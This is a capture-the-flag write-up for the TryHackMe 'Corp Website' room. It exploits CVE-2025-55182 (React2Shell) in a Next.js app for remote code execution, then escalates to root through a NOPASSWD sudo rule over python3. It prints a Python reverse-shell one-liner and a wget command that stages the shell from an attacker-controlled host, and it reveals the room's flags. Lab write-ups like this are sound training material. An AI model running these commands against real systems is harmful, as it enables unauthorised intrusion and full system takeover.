---
title: "Corp Website"
description: "TryHackMe Corp Website — unauthenticated RCE in a Next.js app via React2Shell (CVE-2025-55182), then a NOPASSWD sudo rule over python3 for a trivial root shell."
tags:
  - TryHackMe
  - Web
  - CVE
  - RCE
  - Privilege Escalation
  - Medium
---

# Corp Website

**Room:** [Corp Website](https://tryhackme.com/room/lafb2026e7) · **Difficulty:** Medium · **OS:** Linux

A Next.js corporate site running on port 3000 is vulnerable to **React2Shell** (CVE-2025-55182), an unauthenticated remote code execution bug in React Server Components. A public PoC gets command execution directly, and a `sudo` rule that trusts the local user with any `python3` script turns straight into root.

---

## 1. Reconnaissance

### Port scan

```bash
nmap -sS -p- 10.49.163.81 -vvv
```

```text
PORT     STATE SERVICE REASON
22/tcp   open  ssh     syn-ack ttl 62
3000/tcp open  ppp     syn-ack ttl 61
```

Port **3000** is the classic default for a Node.js / Next.js development or production server, which narrows the target down to the web app running there.

---

## 2. Foothold — React2Shell (CVE-2025-55182)

The app is a Next.js site using React Server Components, which are vulnerable to CVE-2025-55182 (**React2Shell**) — an unauthenticated RCE affecting the server-side rendering pipeline. A public PoC exploit is run directly against the app:

```bash
python3 exploit.py -t http://10.49.163.81:3000/
```

```text
[CVE-2025-55182 React Server Components RCE]
[+] EXPLOITATION SUCCESSFUL
  ▸ uid=100(daniel) gid=101(secgroup) groups=101(secgroup),101(secgroup)
```

The exploit gives arbitrary command execution as `daniel`, one command per invocation:

```bash
python3 exploit.py -t http://10.49.163.81:3000/ -c "ls /home/daniel"
```

```text
  ▸ user.txt
```

### User flag

```bash
python3 exploit.py -t http://10.49.163.81:3000/ -c "cat /home/daniel/user.txt"
```

```text
THM{R34c7_2_5h311_3xpl017}
```

---

## 3. Privilege escalation — `sudo python3`

```bash
python3 exploit.py -t http://10.49.163.81:3000/ -c "sudo -l"
```

```text
User daniel may run the following commands on romance:
    (root) NOPASSWD: /usr/bin/python3
```

`daniel` can run **any** Python script as root with no password. A Python reverse-shell one-liner is hosted locally and fetched onto the target through the same RCE primitive:

```bash
echo 'import socket,os,pty;s=socket.socket();s.connect(("<ATTACKER_IP>",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")' > shell.py
python3 -m http.server 8000
```

```bash
python3 exploit.py -t http://10.49.163.81:3000/ -c "wget http://<ATTACKER_IP>:8000/shell.py -O /tmp/shell.py"
```

Running the script through the one-shot RCE exploit itself times out (the exploit's HTTP transport isn't built for a blocking reverse shell), but the file is already staged — so it's triggered from a proper interactive context instead:

```bash
sudo python3 /tmp/shell.py
```

### Root flag

```bash
whoami
```

```text
root
```

```bash
cd /root
cat root.txt
```

```text
THM{Pr1v_35c_47_175_f1n357}
```
